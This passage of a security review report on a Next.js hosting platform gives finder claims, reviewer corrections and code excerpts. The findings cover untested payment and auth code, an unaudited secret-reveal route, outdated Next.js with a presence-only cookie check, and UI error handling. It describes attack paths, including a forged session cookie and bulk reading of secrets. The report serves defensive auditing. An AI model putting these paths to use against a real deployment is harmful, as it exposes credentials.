**Impact.** The blast-radius modules — session issuance, the sole authorization primitive, secret encryption, and both payment verifiers — are the least tested code in the repo, inverting the risk/coverage relationship. Combined with finding #1 (CI runs no tests), a regression in any of them has no detection mechanism before production.

**Reviewer correction.** The inventory is accurate (84 API routes / 1 co-located test; 39 of 62 src/lib files without a sibling test; zero tests importing auth, rbac, crypto, security, proxy, or payments — the whole suite is the 34 files matched by `npm test`), and the finder actually understated it: the rg it cites returns zero matches, not three. But this is a test-coverage and engineering-risk gap, not a vulnerability. The cited line `src/lib/billing/payments.ts:82` (`return generatedSignature === signature;`) contains correct HMAC-SHA256 verification that fails closed on a missing secret, and both callers hard-gate on it (`if (!isValid) return 400`). It is anonymously reachable via the unauthenticated `POST /api/billing/webhook`, but reaching correct code is not an exploit — there is no attacker input that turns a missing test into harm. Severity high -> low; the only genuine defect at that line is the non-constant-time `===` instead of `crypto.timingSafeEqual`, which is itself low. | Directionally correct and factually exact — I could not find any mitigation, and the surrounding context is actually worse than the finder described. But the severity should drop from high to medium, because the mechanism is absence-of-a-control (regression risk), not an exploitable defect.

What is right (all independently reproduced):
- 84 `route.ts` under `src/app/api`, exactly 1 co-located `route.test.ts` → 1/84.
- 62 non-test `.ts` under `src/lib`, exactly 39 with no sibling test.
- 34 test files repo-wide; no `__tests__`/`tests/` dir exists. I extracted every static `from '...'` AND grepped for dynamic `await import()`/`mock.module`/`require()` in all 34 files: zero references to `lib/auth`, `middleware/rbac`, `lib/crypto`, `lib/security`, `@/proxy`, `billing/payments`, or any of their exported symbols. The finder's inventory is accurate, including via the dynamic-import path they did not claim to check.
- The anchor is fair: payments.ts is 83 lines, and :82 sits inside `verifyWebhookSignature`.

Mitigations I looked for and did NOT find (this is the load-bearing part of my review):
- No CI test gate. `grep -rn "npm test|npm run test|tsx --test|playwright" .github/` returns nothing. `auto-merge-jules.yml` runs only `npm run build`, then auto-approves and squash-merges. So even the 34 passing suites are not a merge gate.
- `@playwright/test` is a devDependency with no config file and no spec files anywhere — an unused dep, not latent e2e coverage.
- `eslint.config.mjs` is stock `eslint-config-next` core-web-vitals + typescript. No security or coverage rules.
- No type constraint helps here: `checkProjectAccess` returns a discriminated union, but nothing forces a caller to branch on `allowed`.

Why medium rather than high: no actor can exploit a missing test file. I read the untested code and it is currently correct — `verifyPaymentSignature` (payments.ts:48-64) and `verifyWebhookSignature` (payments.ts:69-83) are functionally sound HMAC-SHA256 comparisons, both fail closed when the secret is absent, and both callers do gate on the boolean and return 400 on false. The 159/159 suite passes. So there is no present breach — only an unguarded regression pathway.

Why not lower than medium: the pathway is concrete rather than theoretical. `src/app/api/billing/webhook/route.ts` has no `getSession`/`requireAuth` at all — `verifyWebhookSignature` is the sole gate between an anonymous internet POST and `updateUser(userId, {subscription:{tier: ...}})` (lines 39-50), where both `userId` and `tierId` come from attacker-influenced `payment.notes`. That single boolean is pinned by nothing, in a repo where PRs are auto-merged on a build check alone. A one-line regression there (e.g. inverting the check, or an early `return true`) ships silently.

Accurate restatement: "The authentication, authorization, crypto, and payment-signature verification modules have no test coverage, and CI enforces no test gate — so the sole boolean guarding the unauthenticated Razorpay webhook's tier-granting path can regress without any automated signal, in a repo configured to auto-merge on a build check alone."

**Verified code:**

```ts
src/lib/billing/payments.ts (83 lines total; cited line 82 is the penultimate):
  69: export function verifyWebhookSignature(
  70:     body: string,
  71:     signature: string,
  72:     webhookSecret: string | undefined
  73: ): boolean {
  74:     if (!webhookSecret) {
  75:         console.error('[Razorpay Webhook] Cannot verify signature: webhookSecret is missing');
  76:         return false;
  77:     }
  78:
  79:     const hmac = crypto.createHmac('sha256', webhookSecret);
  80:     hmac.update(body);
  81:     const generatedSignature = hmac.digest('hex');
  82:     return generatedSignature === signature;
  83: }

Same file, the other verifier (also correct, also fails closed):
  53:     const secret = config.billing.razorpay.keySecret;
  54:     if (!secret) {
  55:         console.error('[Razorpay] Cannot verify signature: keySecret is missing');
  56:         return false;
  57:     }
  58:
  59:     const hmac = crypto.createHmac('sha256', secret);
  60:     hmac.update(orderId + '|' + paymentId);
  61:     const generatedSignature = hmac.digest('hex');
  62:     retu
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I re-derived every number in the claim from scratch rather than trusting the finder, and the inventory is accurate — in one place it is understated. But under a reachability/exploitability lens the claim is mis-categorized and over-severitized: it describes an absence, not a defect, and nothing at the cited line is exploitable.

WHAT I VERIFIED AS TRUE:
- `find src/app/api -name 'route.ts' | wc -l` -> 84. `find src/app/api -name '*.test.ts'` -> exactly one file, `src/app/api/projects/[id]/storage/[storageId]/query/route.test.ts`. 1/84 confirmed.
- `src/lib` has 62 non-test `.ts` files; a sibling-test check loop returns 39 with no `<name>.test.ts` next to them. 39/62 confirmed.
- I extracted every import specifier across all 34 test files. The full set contains no `lib/auth`, `middleware/rbac`, `lib/crypto`, `lib/security`, `@/proxy`, or `billing/payments`. Zero coverage on those confirmed.
- The finder's own supporting command is WRONG in the claim's favour: it says the rg "returns only the three `*-branching.t...`" files. Running that pattern over `src/**/*.test.ts` returns *nothing* (exit 1); I grepped `firestore-branching.test.ts`, `redis-branching.test.ts`, `storage-branching.test.ts` directly for auth/rbac/crypto/security/proxy/payments and got zero hits. So the coverage gap is total, not partial.
- No escape hatch elsewhere: `npm test` is literally `tsx --test $(find src -name '*.test.ts')`; there is no `__tests__`, `tests/`, or `e2e/` directory anywhere, and `@playwright/test` is a devDependency with no config file. 34 files is the whole suite.
- Untested security surface really is 671 lines: auth.ts 181, proxy.ts 214, security/index.ts 175, crypto.ts 67, rbac.ts 34.

WHY IT IS STILL NOT A HIGH-SEVERITY SECURITY FINDING:
- The cited location, `src/lib/billing/payments.ts:82`, is `return generatedSignature === signature;`. I read the whole file. The HMAC construction is correct (`createHmac('sha256', secret)` over `orderId + '|' + paymentId` for the payment verifier, over the raw body for the webhook verifier), the missing-secret path fails closed with `return false`, and both callers hard-gate on the result (`if (!isValid) return 400`). There is no bug at the cited line.
- Line 82 IS anonymously reachable — `POST /api/billing/webhook` has no `getSession()` call and `src/proxy.ts` does not gate it — so an unauthenticated actor does reach the code. But reaching correct code is not an exploit. A missing test has no actor, no input, and no state that produces a wrong output; there is no failure scenario, and the "claimed failure scenario

</details>

### 🟡 MEDIUM — Revealing a decrypted secret writes no audit record, while every other env-var mutation does
`observability-tests-4` · `src/app/api/projects/[id]/env/[envId]/reveal/route.ts:53`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** The file imports no audit module and calls `logAuditEvent` nowhere — the plaintext secret is returned and the request leaves no trace. By contrast, `src/app/api/projects/[id]/env/route.ts` audits all three mutations (`logAuditEvent` at lines 140, 259, 327), so add/update/delete of a secret is recorded but *reading* it is not. Concretely: a team member with role `developer` (the viewer check at line 29 stops only `viewer`) enumerates the project's env var ids from `GET /api/projects/<id>/env` and then issues `GET /api/projects/<id>/env/<envId>/reveal` for each one, collecting the decrypted DATABASE_URL, Razorpay/Stripe keys, and any GitHub token. `GET /api/teams/<id>/audit` (backed by `listAu

**Impact.** Credential exfiltration by an insider or a stolen session cookie is invisible. During incident response there is no way to answer 'which secrets were read, by whom, and when', so the only safe remediation is rotating every secret in every project. This is the single highest-value read in the product and it is the one action with no audit trail.

**Reviewer correction.** Accurate restatement: GET /api/projects/[id]/env/[envId]/reveal returns the decrypted plaintext of a secret env var (line 53) without writing any record to the application audit log, while every mutation of the same data in src/app/api/projects/[id]/env/route.ts is audited (logAuditEvent at lines 140/259/327). The reaching actor is a team member with role `member` — not `developer`, which does not exist in this codebase — and `member` is the default role assigned by POST /api/teams/[id]/invite, so an ordinary invitee qualifies. Viewers are correctly blocked (line 29) and anonymous requests get 401; the mock-session bypass in src/lib/auth.ts:99 is dev-only and does not apply under NODE_ENV=production with MOCK_DB unset. The exposure is a detective-control gap, not an authorization break: the same actor is already permitted to read and mutate the secret, and an audited path to the same plaintext exists (PUT with isSecret:false decrypts at env/route.ts:246 and logs 'env_var.updated'), so the reveal route is simply the quieter route to data the actor may already obtain. What is lost is forensic and compliance visibility — a team owner reviewing /dashboard/settings audit logs cannot distinguish a member who read every project secret from one who read none. "Leaves no trace" should be narrowed to "leaves no application-level trace"; Cloud Run HTTP access logs would still record the request path (project id and envId), though not the actor's identity. Fix is one call: logAuditEvent(project.teamId || null, session.user.id, 'env_var.revealed', { projectId: project.id, envVarKey: envVar.key, envVarId: envVar.id }) before the return at line 53, logging the key and id but never the value. | Accurate restatement: GET /api/projects/[id]/env/[envId]/reveal returns the decrypted plaintext of a secret env var without writing an audit record, while the three mutating operations on the same resource (env/route.ts:140, 259, 327) all call logAuditEvent. This is a missing detective control (CWE-778 insufficient logging), not an authorization or disclosure flaw: the handler requires a valid session, requires project membership or personal ownership via checkProjectAccess, and explicitly rejects the `viewer` role, and the envId is resolved only within that project's own envVariables, so no cross-project IDOR exists. Everyone who can reach the plaintext is already entitled to it. The practical consequence is narrow — after an insider abuse or a stolen session belonging to an owner/admin/member, the team's audit log (surfaced by /api/teams/[id]/audit) shows which secrets were created, changed or deleted, and shows deploys, but not which secrets were read. Note the claim's scenario cites a `developer` role that does not exist in this codebase (TeamRole is owner|admin|member|viewer), and that on personal projects (teamId null) audit events are unretrievable anyway because listAuditLogs filters on teamId equality, so the fix only has effect for team-owned projects. Fix is a single logAuditEvent(project.teamId || null, session.user.id, 'env_var.revealed', { projectId, envVarKey, envVarId }) before the return at line 53.

**Verified code:**

```ts
src/app/api/projects/[id]/env/[envId]/reveal/route.ts (imports — no audit module):
     1	import { NextRequest, NextResponse } from 'next/server';
     2	import { getSession } from '@/lib/auth';
     3	import { checkProjectAccess } from '@/middleware/rbac';
     4	import { decrypt } from '@/lib/crypto';
     5	import { securityHeaders } from '@/lib/security';
     6	import type { EnvVariable } from '@/types';

Same file, the guard and the unaudited plaintext return:
    28	        // Viewers are not allowed to reveal secrets
    29	        if (access.role === 'viewer') {
    30	            return NextResponse.json(
    31	                { error: 'Forbidden: Viewers cannot reveal secrets' },
    32	                { status: 403, headers: securityHeaders }
    33	            );
    34	        }
    43	        let value = envVar.value;
    44	        if (envVar.isEncrypted) {
    45	            try {
    46	                value = decrypt(value);
    ...
    53	        return NextResponse.json({ value }, { headers: securityHeaders });

src/app/api/projects/[id]/env/route.ts (the audite
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the cited file in full, plus checkProjectAccess, lib/audit.ts, the sibling env/route.ts, src/proxy.ts, getSession, getTeamMembership, and the UI caller.

FACTS CONFIRMED:
1. The file's import block (lines 1-6) contains no '@/lib/audit' import, and grep for logAuditEvent across src/ returns 36 hits in 20 route files — the reveal route is not among them. src/lib/audit.ts is the only writer to Collections.AUDIT_LOGS ('auditLogs'), which is exactly what /dashboard/settings renders. So a successful reveal produces zero application audit record. There is no success-path console.log either (console.error fires only on decrypt failure at line 48 and the outer catch at line 55). src/proxy.ts does no per-request logging on the success path (it only calls trackError inside its own catch).
2. The asymmetry is real: env/route.ts imports logAuditEvent at line 4 and calls it at 140 ('env_var.created'), 259 ('env_var.updated') and 327 ('env_var.deleted').

REACHABILITY (my lens) — the path holds in production:
- Entry point is a live App Router GET handler at /api/projects/{id}/env/{envId}/reveal, actually wired to the UI: src/components/EnvVariablesSection.tsx:79 calls revealEnvVariable, which fetches that URL at src/store/project-slice.ts:598. Not dead code.
- Anonymous is blocked (getSession null -> 401). getSession's MOCK_SESSION fallback at src/lib/auth.ts:99 is gated on NODE_ENV==='development' || MOCK_DB==='true', so it does not apply in the stated deployment. getTeamMembership (db.ts:751) is a real Firestore query with no mock branch.
- 'viewer' is explicitly blocked at line 29.
- The minimum role that reaches line 53 is a real, non-privileged one: 'member'. TeamRole is 'owner'|'admin'|'member'|'viewer' (src/types/index.ts:75), and 'member' is the DEFAULT role for team invites (src/app/api/teams/[id]/invite/route.ts:47: `const { email, role = 'member' } = body`). So an ordinary invitee — not an admin — can enumerate env var ids via GET /api/projects/{id}/env (which returns ids with values masked as '••••••••') and then pull every plaintext secret one id at a time, with nothing landing in the audit log. Rate limiting in proxy.ts is 100 req/min per IP+pathname, and each envId is a distinct pathname, so it is not even a throttle here.

WHY I STILL CORRECT IT RATHER THAN AFFIRM AS-IS:
- The scenario names role `developer`. No such role exists in this codebase; the reaching role is `member`. Directionally right, wrong role name.
- "leaves no trace" is slightly overstated: no application-level trace, but a Cloud Run HTTP access log would still rec

</details>

### 🟡 MEDIUM — Next.js is pinned below the fixes for multiple Middleware/Proxy-bypass advisories, and src/proxy.ts is the sole edge auth gate
`ops-config-supply-4` · `package.json:42`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** An unauthenticated attacker requests a `/dashboard/...` path using one of the published segment-prefetch or dynamic-route-parameter forms covered by GHSA advisories fixed in 16.2.5/16.2.6. Because the running Next.js is 16.2.3 and the manifest floor `^16.2.4` still resolves below every fix, `proxy()` is not invoked for that request, so the cookie check at line 156 never runs and the dashboard route renders without a session. Separately, `subdomain` at line 87/90 is derived purely from the client-supplied `Host` header and fed into `NextResponse.rewrite`, which is precisely the shape of the rewrite-SSRF advisory fixed in 16.2.11.

**Impact.** Unauthenticated reach into authenticated dashboard routes and SSRF from the platform's own edge. Also reachable in the same prod tree, from the same audit: mysql2 (high, 'Auth Plugin Downgrade to mysql_clear_password Leaks Plaintext Credentials' — directly relevant since src/lib connectors dial user-owned MySQL over the network), axios (high, multiple NO_PROXY/SSRF bypasses), and js-yaml (high, qu

**Reviewer correction.** Accurate restatement: the lockfiles — not package.json:42 — pin Next.js inside a published advisory range. `package-lock.json` pins 16.2.4, `pnpm-lock.yaml` resolves 16.2.3, and `node_modules` runs 16.2.3, while `npm audit` reports `next` vulnerable across `9.3.4-canary.0 - 16.3.0-preview.10` (fixed at 16.3.0+; latest is 16.3.4). The manifest range `^16.2.4` already permits the fix, so the remediation is a lock refresh / `npm audit fix`, not a manifest bump, and the fix target is 16.3.x, not the non-existent 16.2.5/16.2.6. The claimed impact — that a Middleware/Proxy bypass grants unauthenticated access to `/dashboard/...` — does not hold: proxy.ts:155-177 checks only cookie presence and never verifies the JWT, so it is already bypassable with an arbitrary cookie value and is not the auth boundary. Enforcement lives in `src/app/dashboard/layout.tsx:19-31` (cryptographic `getSession()` → `jwtVerify`, refuses to render children) and, decisively, in the API layer, since all dashboard pages are `'use client'` with no server-side data and 77/84 API routes independently authenticate and authorize. This should be reclassified from "high — edge auth bypass" to "low — dependency patch hygiene / stale lockfile," with the DoS, cache-poisoning, SSRF and CSP-nonce-XSS advisories in that range as the actual reason to upgrade. | Accurate restatement: The lockfile — not package.json:42 — pins next at 16.2.4, which npm audit flags against 22 advisories, several unfixed until 16.2.11 (current stable is 16.3.4). The declared range `^16.2.4` already permits every fixed release, so `npm update next` resolves this with no manifest edit. The claimed consequence is wrong: src/proxy.ts is not an auth gate. Its dashboard block (lines 155-178) tests only that a `deployify_session` cookie is *present* — the token value is never verified in production — so any anonymous attacker already passes it with an arbitrary cookie value, and a Middleware/Proxy-bypass CVE confers no additional access. Real authentication happens independently in src/app/dashboard/layout.tsx via getSession() → jwtVerify(), which returns a data-free redirect stub on failure, and in the 76/84 API routes that call getSession/requireAuth/checkProjectAccess. The upgrade is warranted for the anonymously reachable DoS, SSRF, and Server-Function-endpoint-disclosure advisories, not for a dashboard auth bypass. Worth noting as a separate finding: the presence-only cookie check plus the layout comment "middleware already verified cookie exists" reflects a mistaken belief that the proxy authenticates, which is a latent hazard if anyone ever relies on it.

**Verified code:**

```ts
package.json:40-44 (the claimed location — a caret range, not a pin):
  40	    "mongodb": "^7.1.1",
  41	    "mysql2": "^3.20.0",
  42	    "next": "^16.2.4",
  43	    "next-auth": "^4.24.13",
  44	    "next-themes": "^0.4.6",

package-lock.json:10410-10413 (where the real pin is):
 10410	    "node_modules/next": {
 10411	      "version": "16.2.4",
 10412	      "resolved": "https://registry.npmjs.org/next/-/next-16.2.4.tgz",

pnpm-lock.yaml:74-76:
   74	      next:
   75	        specifier: ^16.2.3
   76	        version: 16.2.3(...)

node_modules/next/package.json: "version": "16.2.3"
`npm view next version` → 16.3.4
`npm audit --json` → {"name":"next","severity":"high","range":"9.3.4-canary.0 - 16.3.0-preview.10","fixAvailable":true}
(advisory list includes GHSA-267c-6grr-h53f, GHSA-26hh-7cqf-hhc6, GHSA-492v-c6pp-mqqv — real, but the fix boundary is 16.3.0, not 16.2.5/16.2.6.)

src/proxy.ts:154-178 — presence-only check, no signature verification:
  154	        // Check authentication for protected dashboard routes
  155	        if (pathname.startsWith('/dashboard') || pathname.starts
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** Three of the claim's four load-bearing assertions are false; a fourth (Next.js is outdated and carries real proxy-bypass advisories) is true but is a patch-hygiene item, not the high-severity auth bypass described.

1. The named location does not hold the pin. `package.json:42` is `"next": "^16.2.4"` — a caret range, i.e. `>=16.2.4 <17.0.0`. `npm view next version` returns 16.3.4, so a fresh install from this manifest resolves to the FIXED version. The claim's core statement, "the manifest floor `^16.2.4` still resolves below every fix," is arithmetically wrong. The actual pinning is in the lockfiles: `package-lock.json` pins `next` 16.2.4, `pnpm-lock.yaml` records specifier `^16.2.3` → 16.2.3, and `node_modules/next/package.json` has 16.2.3. Fix = refresh the lock, not edit package.json:42.

2. The claimed fix versions do not exist. `npm audit --json` reports the vulnerable range for `next` as `9.3.4-canary.0 - 16.3.0-preview.10`. There is no 16.2.5/16.2.6 fix boundary — 16.2.5 and 16.2.6 would be just as vulnerable. The fix line is 16.3.0 stable or later. The finder invented the version boundary.

3. "src/proxy.ts is the sole edge auth gate" is false, and the gate is not an auth gate. `proxy()` lines 155-177 test only for the PRESENCE of the cookie (`request.cookies.get('deployify_session')`); it never calls `verifySessionToken`/`jwtVerify`. Any unauthenticated attacker can already walk straight past it today with `Cookie: deployify_session=x`, with no CVE, no prefetch trick, no exploit. A Next.js bypass advisory therefore buys an attacker nothing they don't already have for free. Line 156 "never running" is not a security event.

4. The real gate the finder missed. `src/app/dashboard/layout.tsx:19` calls `getSession()` (src/lib/auth.ts:88), which decodes the cookie and hands it to `verifySessionToken()` (src/lib/auth.ts:43) → `jwtVerify(token, getSecret(), {algorithms:[JWT_ALGORITHM]})`, a real HS256 signature check returning `null` on any forged/absent/expired token. When null, the layout returns early at lines 22-31 and never renders `{children}` — so the page segment's component is never invoked. The finder's own note ("middleware already verified cookie exists") is the layout's stale comment, not evidence that the layout defers enforcement; the code enforces regardless.

5. Even that layout is not the last line. All 12 `src/app/dashboard/**/page.tsx` files and `src/app/new/page.tsx` begin with `'use client'` and perform zero server-side data access — grep for `getSession|db\.|listProjects` across dashboard pages returns only unrelate

</details>

### 🟡 MEDIUM — Redeploy and Cancel always show a green success toast, even when the API rejects the request with a 403/400
`product-ux-1` · `src/app/dashboard/[id]/page.tsx:86`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** A Free-plan customer at their 20-deployment monthly cap opens /dashboard/<id> and clicks "Redeploy". /api/projects/[id]/deploy returns 403 with `{error: "Usage limit exceeded: deployments. Please upgrade your plan."}`. redeployProject sees `!response.ok`, skips fetchDeployments, logs nothing user-visible, and resolves. handleRedeploy then fires `toast.success('Deployment triggered')`. The user sees a green success toast, no new row appears in the deployment list, and they have no way to learn they hit a quota. Identical for a `viewer`-role teammate (403) and for a repo that fails pre-flight validation (400 with a specific `validation.error`). handleCancel has the same shape: it reports "Depl

**Impact.** The two most-used buttons on the project page lie about success. Users retry, escalate to support, or silently lose deployments. The upgrade prompt — the one message that would convert a capped Free user to Pro — is generated by the server and discarded by the client, so quota exhaustion reads as a broken product rather than a paywall.

**Reviewer correction.** The bug is real and reachable by unprivileged actors, but it is a client-side UX/feedback defect, not a security or authorization defect, and it is broader than the single cited line.

Accurate restatement: `redeployProject` and `cancelDeployment` in src/store/project-slice.ts (lines 220-251) return `Promise<void>` and silently discard every non-2xx response — no `else` branch, no thrown error, no error state, and not even a `console.error` (the catch covers only network failures). Their callers therefore fire `toast.success(...)` unconditionally: src/app/dashboard/[id]/page.tsx:90 ("Deployment triggered"), :97 ("Deployment cancelled"), and — a second instance the finder missed — src/app/dashboard/[id]/deployments/page.tsx:112 ("Deployment cancelled"). A fix applied only at page.tsx:86 leaves the deployments page broken; the right fix is to make the two store actions return a result (or throw) and have all three call sites branch on it, matching `confirmRollback` at page.tsx:117-124.

Reachable rejection paths that all render as green success: 403 free-tier deployment cap (tiers.ts:36, `deployments: 20`); 403 viewer-role rejection, reachable because the page renders Redeploy/Cancel with no role gate at all despite the store holding `userRole` (project-slice.ts:177); 400 repo-validation and 400 GitHub-commit-fetch failures; and for Cancel, 400 "Cannot cancel completed deployment" and 404 "Deployment not found".

Severity should be medium, not high: server-side RBAC and the usage cap correctly reject the request in every one of these paths, so nothing is bypassed and no data is exposed or corrupted. The harm is a user misled into believing a deployment was triggered or cancelled when it was not, partially offset by the deployment list not refreshing. | Confirmed, with a broader mechanism and a lower severity than claimed. `redeployProject` (src/store/project-slice.ts:220) and `cancelDeployment` (:240) return `Promise<void>` and swallow both the `!response.ok` branch (no `else`) and the network `catch`, so the awaiting handlers at src/app/dashboard/[id]/page.tsx:89-90 and :96-97 have no signal to branch on and always convert the loading toast into a green success. The false success therefore fires on every rejection, not just the 403 usage cap: viewer-role 403, repo-validation 400, commit-fetch 400, cancel 400/404, 401 expired session, 5xx, and offline. The same pattern is duplicated at src/app/dashboard/[id]/deployments/page.tsx:112. Severity is medium rather than high: it is a purely client-side display defect — the API correctly refuses, no state is corrupted, and the deployments list stays visibly unchanged; the only material harm is a user believing a build was cancelled when the DELETE actually failed. The fix is to have the two store actions return a boolean or throw (mirroring confirmRollback at :121-127, which already handles the error branch correctly).

**Verified code:**

```ts
src/app/dashboard/[id]/page.tsx:86-98
    86  const handleRedeploy = async (force = false) => {
    87      if (!project) return;
    88      const toastId = toast.loading(force ? 'Triggering force redeploy (ignoring cache)...' : 'Triggering deployment...');
    89      await redeployProject(project.id, force);
    90      toast.success('Deployment triggered', { id: toastId });
    91  };
    93  const handleCancel = async (deploymentId: string) => {
    94      if (!project) return;
    95      const toastId = toast.loading('Cancelling deployment...');
    96      await cancelDeployment(project.id, deploymentId);
    97      toast.success('Deployment cancelled', { id: toastId });
    98  };

src/store/project-slice.ts:220-251 (the swallow point — no else branch)
   220  redeployProject: async (projectId, force = false) => {
   221      set({ isRedeploying: true });
   222      try {
   223          const response = await fetch(`/api/projects/${projectId}/deploy`, {
   224              method: 'POST',
   225              headers: { 'Content-Type': 'application/json' },
   226        
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the cited file, the store slice it delegates to, and the API route it calls, and the mechanism holds exactly as described.

1. `handleRedeploy` (src/app/dashboard/[id]/page.tsx:86-91) awaits `redeployProject`, which returns `Promise<void>`, then unconditionally calls `toast.success('Deployment triggered', { id: toastId })`. Sonner's `{id: toastId}` replaces the in-flight loading toast, so the user sees a green success.

2. `redeployProject` (src/store/project-slice.ts:220-237) is the swallow point: `if (response.ok) { await get().fetchDeployments(projectId); }` with NO `else` branch. A non-2xx response is not read, not logged, not stored in any error state, and does not throw. The `catch` only fires on network/parse failures, and even then only `console.error`s. Same for `cancelDeployment` (lines 240-251).

3. There is no global `fetch` wrapper that could surface the error — grepping for `window.fetch =` / `globalThis.fetch =` finds only two test files. Nothing else in the page displays an error state.

4. Contrast with `confirmRollback` in the same file (lines 104-127), which does `if (response.ok) {...} else { const err = await response.json(); toast.error(err.error || 'Failed to rollback', ...) }` — proving the correct pattern exists three functions away and was simply not applied here.

REACHABILITY — this is reachable by ordinary, unprivileged actors in production; no admin, no dev env var, no dead code:

- Free-tier cap (the claimed scenario, confirmed): `src/lib/billing/tiers.ts:36` sets `deployments: 20` per month for the default tier; `checkUsageLimits` → `calculateLimitStatus` returns `withinLimits: false, limitType: 'deployments'` at >=100%, and the route returns 403 `Usage limit exceeded: deployments. Please upgrade your plan.` Any signed-up free tenant hits this by clicking Redeploy a 21st time in a month.
- Viewer team member (an even cleaner unprivileged path the finder did not cite): the route returns 403 `Forbidden: Viewers cannot trigger deployments` / `Forbidden: Viewers cannot cancel deployments`, and the page does NOT gate the buttons by role — `grep -n "viewer\|role"` over src/app/dashboard/[id]/page.tsx returns zero hits, and the Redeploy `MovingBorderButton` at line 212 is rendered unconditionally (only `disabled={deploying}`). The store even fetches `userRole` (project-slice.ts:177) but the page never reads it. So a viewer clicks Redeploy, is correctly rejected by the server, and is told "Deployment triggered".
- 400 paths, hit by any owner with no quota problem: `validateRepository` failure and `getBranchLat

</details>

### 🟡 MEDIUM — Dashboard silently renders the first-run "Welcome to Deployify" onboarding screen whenever /api/projects fails
`product-ux-2` · `src/app/dashboard/page.tsx:79`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** A customer with 20 live projects leaves a dashboard tab open past JWT expiry, or Firestore has a blip. On focus/team-switch the effect refires; /api/projects returns 401 or 500. `response.json()` succeeds (both are JSON), `data.projects` is undefined, `setProjects([])` runs, `loading` flips false, and the page renders `<OnboardingGuide />`: "Welcome to Deployify — Connect GitHub / Import Project". The fleet-health header at line 127 is also gated on `projects.length > 0` so it vanishes too. The user's honest read is that their entire account was wiped. Same outcome on a 500 that returns an HTML error page: `.json()` throws, the catch only console.errors, `projects` stays `[]`, onboarding ren

**Impact.** The single worst error state a hosting platform can show a paying customer: total data loss, presented calmly as a welcome screen, with no error text and no retry control. There is no path back other than a manual reload, and a user who believes their projects are gone opens a P1 ticket or churns.

**Reviewer correction.** The defect is real and unmitigated, but the trigger and severity are wrong. Accurate restatement: `fetchProjects` in src/app/dashboard/page.tsx:72-87 never inspects `response.ok`/`response.status`, so any non-2xx from `/api/projects` — all of which return a JSON body with no `projects` key — collapses through `data.projects || []` into an empty array, flips `loading` false in the `finally`, and renders the first-run `<OnboardingGuide/>` ("Welcome to Deployify") at page.tsx:274-276 to a customer who has projects. The `try/catch` cannot help because an HTTP error is a resolved promise, and `dashboard/error.tsx` cannot help because nothing throws during render.

The finder's "on focus" trigger does not exist: there is no focus or visibilitychange listener anywhere on this page (the only `window.addEventListener` is a `keydown` handler for the `/` search shortcut), and the effect deps are `[activeTeam, isTeamLoading]` — it refires on team switch or remount only.

The JWT-expiry path is also mostly already mitigated: the cookie `maxAge` and the JWT `exp` are both 7 days (auth.ts:34, :122), so proxy.ts's `/dashboard` cookie check redirects to `/login` and dashboard/layout.tsx's null-session branch renders "Redirecting to login..." on any page load or hard navigation. Reaching the bug that way needs a tab mounted for a full 7 days plus a team switch.

The realistic, unmitigated trigger is a backend failure with a perfectly valid session: a Firestore fault (`listPersonalProjects` at db.ts:1096 has no try/catch) → 500, a stale team membership → 403, or proxy.ts's 100-req/min-per-`ip:pathname` limiter behind a shared NAT → 429. Impact is a transient, self-correcting misrepresentation of account state — alarming ("did my 20 projects get deleted?") but no data loss, no corruption, and no security boundary crossed. Medium, not high.

The same pattern is present at src/app/dashboard/infrastructure/page.tsx:97 and src/components/CommandPalette.tsx:49, so the fix should cover all three. | Accurate restatement: the dashboard's fetchProjects (src/app/dashboard/page.tsx:79-81) treats every HTTP response as success — it calls response.json() without checking response.ok, so any error body (which never contains a `projects` key) collapses to `setProjects([])`, and the render guard at line 274 then shows the first-run "Welcome to Deployify" onboarding screen to a customer who has live projects. The catch branch (line 82-86) produces the same screen on a network failure at first mount, since it logs only and still runs setLoading(false).

The realistic triggers are NOT the claimed 401/JWT-expiry path: src/app/dashboard/layout.tsx is a force-dynamic server component that hard-redirects to /login when getSession() returns null, and src/proxy.ts redirects cookie-less /dashboard requests to /login, so any page load or client-side navigation with an expired session goes to login instead. With the JWT and cookie both at 7 days, the 401 case needs a tab left open for a week followed by an in-page team switch (TeamSwitcher does not navigate). The reachable triggers are the 500 from the route's own catch on a Firestore fault, the proxy's 429 at 100 req/min per IP+pathname (shared NAT), the 403 "Unauthorized access to team" when a member is removed while their tab holds a stale activeTeam, and plain network failure. Also, the effect has no focus/visibilitychange listener — that part of the scenario is fabricated.

Impact is a transient, self-healing, misleading empty state with no data loss, no disclosure, and no authorization impact — alarming ("did my 20 projects get deleted?") and worth fixing by checking response.ok and adding an error state, but medium, not high.

**Verified code:**

```ts
src/app/dashboard/page.tsx:71-87 (fetchProjects — no status check, catch cannot fire on an HTTP error):
    71	    useEffect(() => {
    72	        async function fetchProjects() {
    73	            setLoading(true);
    74	            try {
    75	                let url = '/api/projects';
    76	                if (activeTeam) {
    77	                    url += `?teamId=${activeTeam.id}`;
    78	                }
    79	                const response = await fetch(url);
    80	                const data = await response.json();
    81	                setProjects(data.projects || []);
    82	            } catch (error) {
    83	                console.error('Failed to fetch projects:', error);
    84	            } finally {
    85	                setLoading(false);
    86	            }
    87	        }

src/app/dashboard/page.tsx:108-112 (effect deps — team switch / remount only, NO focus listener):
   108	        if (!isTeamLoading) {
   109	            fetchProjects();
   110	            fetchInfraHealth();
   111	        }
   112	    }, [activeTeam, isTeamLoading]);

src/app/da
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted for a mitigation and found none. Concretely ruled out:

1. No response guard in the fetch. `fetchProjects` (page.tsx:72-87) never touches `response.ok` or `response.status`. Grepping the whole file for `.ok`/`status` returns zero hits (the only matches are the substring "error" in `catch (error)` and a CSS var `--error`). The `try/catch` only catches network/parse throws — a 401/403/429/500 is a resolved promise with a valid JSON body, so the catch never fires.

2. No global fetch interceptor. `grep -rn "window\.fetch *=|globalThis\.fetch *=|onUnauthorized|sessionExpired"` over `src/` returns nothing. The only client-side `status === 401` handling in the repo is in `src/store/billing-slice.ts` and one route test — neither is on this path.

3. The error boundary cannot help. `src/app/dashboard/error.tsx` exists but is a React render-error boundary; nothing throws during render here, so it never engages.

